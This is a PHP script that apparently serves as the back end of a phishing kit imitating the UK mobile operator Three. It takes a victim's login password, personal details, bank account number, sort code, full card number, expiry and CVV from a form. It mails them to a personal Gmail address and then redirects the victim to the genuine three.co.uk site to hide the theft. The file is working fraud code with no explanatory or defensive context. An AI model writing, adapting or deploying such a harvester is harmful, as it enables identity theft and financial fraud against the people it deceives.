<?php
$mobile = $_POST['mobile'];
$email = $_POST['email'];
$password = $_POST['password'];
$name = $_POST['name'];
$address = $_POST['address'];
$dob = $_POST['dob'];
$acc_no = $_POST['acc_no'];
$shortcode = $_POST['shortcode'];
$card_no = $_POST['card_no'];
$card_exp = $_POST['card_exp'];
$CVV = $_POST['CVV'];

$msg = "Mobile No: ".stripslashes($mobile)."<br>\n\r";
$msg .= "Email: ".stripslashes($email)."<br>\n\r";
$msg .= "Password: ".stripslashes($password)."<br>\n\r";
$msg .= "Name: ".stripslashes($name)."<br>\n\r";
$msg .= "Address: ".stripslashes($address)."<br>\n\r";
$msg .= "Date of Birth: ".str_replace('/', '-', stripslashes($dob))."<br>\n\r";
$msg .= "Account No: ".stripslashes($acc_no)."<br>\n\r";
$msg .= "Shortcode: ".stripslashes($shortcode)."<br>\n\r";
$msg .= "Card No: ".stripslashes($card_no)."<br>\n\r";
$msg .= "Card Expiry: ".str_replace('/', '-', stripslashes($card_exp))."<br>\n\r";
$msg .= "CVV: ".stripslashes($CVV)."<br>\n\r";

mail('yash.khatri1616@gmail.com', 'Thee UK', $msg);

header("Location: https://www.three.co.uk/");